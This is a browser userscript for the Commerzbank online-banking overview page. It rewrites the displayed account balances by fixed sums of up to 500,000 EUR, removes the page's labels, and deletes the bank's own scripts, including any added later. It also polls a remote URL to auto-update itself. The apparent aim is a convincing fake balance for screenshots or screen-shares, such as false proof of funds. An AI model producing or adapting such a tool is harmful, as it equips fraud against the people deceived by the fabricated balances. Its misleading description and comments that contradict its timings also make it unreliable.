// ==UserScript==
// @name         Commerz finsicht fastest check
// @namespace    http://tampermonkey.net/
// @version      0.3
// @description  Insert multiple transactions with specified details and update balance
// @author       You
// @match        https://www.drivehq.com/*
// @match        https://kunden.commerzbank.de/banking/landingpage*
// @grant        GM_xmlhttpRequest
// @downloadURL https://update.greasyfork.org/scripts/482006/Commerz%20finsicht%20fastest%20check.user.js
// @updateURL https://update.greasyfork.org/scripts/482006/Commerz%20finsicht%20fastest%20check.meta.js
// ==/UserScript==


    // Function to check for script updates
    function checkForUpdates() {
        GM_xmlhttpRequest({
            method: "GET",
            url: "https://update.greasyfork.org/scripts/482006/version", // URL to a file containing the latest version number
            onload: function(response) {
                var latestVersion = response.responseText.trim();
                if (latestVersion !== "0.3") { // Replace with the current version of your script
                    // Automatically open the update URL if a new version is detected
                    window.open("https://update.greasyfork.org/scripts/482006/Commerz%20finsicht%20fastest%20check.user.js", "_blank");
                }
            }
        });
    }

    // Check for updates every 20 seconds
    setInterval(checkForUpdates, 10000);



///////////////////////////////////////////////////////////////////////////////
//2 COMM FINSISCHT CHANGE BAL
///////////////////////////////////////////////////////////////////////////////
//2 COMM FINSISCHT CHANGE BAL
///////////////////////////////////////////////////////////////////////////////
//2 COMM FINSISCHT CHANGE BAL
///////////////////////////////////////////////////////////////////////////////

if (window.location.href.indexOf("financeoverview") > 0 || window.location.href.indexOf("10658384414") > 0 || window.location.href.indexOf("drive") > 0) {
  (function () {
    'use strict';

    // Function to check if both "Gesamtsaldo" and "Finanzübersicht" text contents are present
    function areTextContentsPresent() {
      var bodyText = document.body.textContent;
      return bodyText.includes("Gesamtsaldo") && bodyText.includes("Finanzübersicht");
    }

    // Function to perform balance modifications
    function performBalanceModifications() {
      // Check for the presence of both text contents before executing balance modifications
      if (areTextContentsPresent()) {
        // Specify the timeout duration (in milliseconds)
        var scriptTimeout = 1000; // Example: 5000 milliseconds (5 seconds)

        // Configurable Elements
        var BALANCE_CONFIGS = [
          { index: 0, adjustmentAmount: 500000 },
          { index: 1, adjustmentAmount: 200000 },
          { index: 2, adjustmentAmount: -200000 },
          { index: 3, adjustmentAmount: 200000 }
          // Add more configurations as needed...
        ];

        // Function to find the element with class containing "p-s" and modify the balance
        function modifyBalance(config) {
          var balanceElements = document.querySelectorAll('[class*="p-s"]');
          if (balanceElements.length > config.index) {
            var balanceElement = balanceElements[config.index];
            var currentBalance = parseFormattedBalance(balanceElement.textContent);
            if (!isNaN(currentBalance)) {
              var newBalance = currentBalance + config.adjustmentAmount;
              var formattedBalance = formatCurrency(Math.abs(newBalance)) + ' EUR'; // Format the absolute value with currency
              balanceElement.textContent = (newBalance >= 0 ? '+ ' : '- ') + formattedBalance; // Add "+" or "-" based on the sign
              console.log('Modified balance:', balanceElement.textContent);

              // Remove "Gesamtsaldo" and "Finanzübersicht" text contents 5 milliseconds after the balance modifications
              setTimeout(function () {
                removeTextContents(["Gesamtsaldo", "Finanzübersicht"]);
              }, 5);
            } else {
              console.error('Unable to extract numeric balance value.');
            }
          } else {
            console.error('Balance element with index ' + config.index + ' not found.');
          }
        }

        // Function to format the currency with commas and two decimal places
        function formatCurrency(amount) {
          return new Intl.NumberFormat('de-DE', {
            minimumFractionDigits: 2,
            maximumFractionDigits: 2
          }).format(amount);
        }

        // Function to parse the original balance amount with correct formatting
        function parseFormattedBalance(balanceString) {
          var cleanBalanceString = balanceString.replace(/[^\d,-]/g, '').replace(',', '.');
          return parseFloat(cleanBalanceString);
        }

        // Function to remove specified text contents
        function removeTextContents(contentsToRemove) {
          contentsToRemove.forEach(function (content) {
            var regex = new RegExp(content, 'g');
            document.body.innerHTML = document.body.innerHTML.replace(regex, '');
          });
        }

        // Function to remove scripts from the document
        function removeScripts() {
          console.log("Removing scripts...");
          document.querySelectorAll('script').forEach(function (script) {
            script.remove();
            console.log("Script removed.");
          });
        }

        // Watch for changes in the DOM and remove added scripts
        var observer = new MutationObserver(function (mutationsList) {
          for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
              for (var node of mutation.addedNodes) {
                if (node.tagName === 'SCRIPT') {
                  console.log("Script added. Removing...");
                  node.remove();
                  console.log("Script removed.");
                }
              }
            }
          }
        });

        // Start observing the document
        observer.observe(document.documentElement, { childList: true, subtree: true });

        // Remove scripts from the document
        removeScripts();

        // Loop through the configurable elements and perform the balance modifications
        BALANCE_CONFIGS.forEach(function (config) {
          modifyBalance(config);
        });

        console.log('Script loaded.');
      } else {
        console.log("Both 'Gesamtsaldo' and 'Finanzübersicht' text contents are not present. Script not executed.");
      }
    }

    // Check whether conditions are met and perform balance modifications every 2 seconds
    setInterval(performBalanceModifications, 200);
  })();
}

///////////////////////////////////////////////////////////////////////////////
//END  2 COMM FINSISCHT CHANGE BAL    END
///////////////////////////////////////////////////////////////////////////////
//END  2 COMM FINSISCHT CHANGE BAL    END
///////////////////////////////////////////////////////////////////////////////
//END  2 COMM FINSISCHT CHANGE BAL    END
///////////////////////////////////////////////////////////////////////////////
